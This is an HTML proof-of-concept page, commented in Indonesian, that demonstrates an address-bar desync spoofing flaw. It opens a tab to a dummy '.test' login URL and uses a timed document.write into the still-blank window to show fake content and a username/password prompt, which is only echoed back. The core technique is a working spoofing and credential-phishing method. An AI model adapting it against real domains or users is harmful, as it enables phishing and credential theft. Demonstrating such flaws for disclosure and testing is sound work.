<!DOCTYPE html>
<html>
<head>
  <title>Safe Address Bar Desync PoC</title>
  <style>
    body { font-family: Arial; padding: 20px; }
    button { padding: 12px; font-size: 16px; cursor: pointer; }
  </style>
</head>
<body>

<h1>Safe Address Bar Desync PoC</h1>
<p>Versi lengkap dan mirip seperti PoC yang kamu ceritakan, namun 100% aman.</p>
<p>Tekan tombol di bawah ini.</p>

<button onclick="runTest()">Run Safe PoC</button>

<script>
function runTest() {
  // 1. URL target dummy (AMAN)
  // Domain '.test' adalah reserved TLD BUAT TESTING (RFC 2606)
  let targetURL = "https://dummy.test/login";

  // 2. Buka tab baru ke target URL
  let win = window.open(targetURL, "_blank");

  // 3. Beri jeda kecil supaya UI WebView meng-update address bar
  //    sebelum navigasi commit (sama seperti PoC aslimu)
  setTimeout(() => {
    try {

      // 4. Inject konten ke about:blank (sama mekanisme,
      //    tetapi aman dan tidak spoof domain siapa pun)
      win.document.write(`
        <h1 style='color:red;'>This is NOT the real target page!</h1>
        <p>You are still on <strong>about:blank</strong>, but UI may show the dummy URL.</p>
        <br>
        
        <button onclick="
          let username = prompt('Enter username (safe demo)');
          let password = prompt('Enter password (safe demo)');
          alert('Safe Demo Only:\\nUsername: ' + username + '\\nPassword: ' + password);
        ">Test Interaction</button>

        <p style='margin-top:20px; font-size:14px; color:gray;'>
          (This is a harmless demonstration page created from about:blank.)
        </p>
      `);

      win.document.close();

    } catch(e) {
      console.warn('Navigation commit occurred too early or blocked:', e);
    }
  }, 50); // timing race â€” sama seperti PoC asli
}
</script>

</body>
</html>
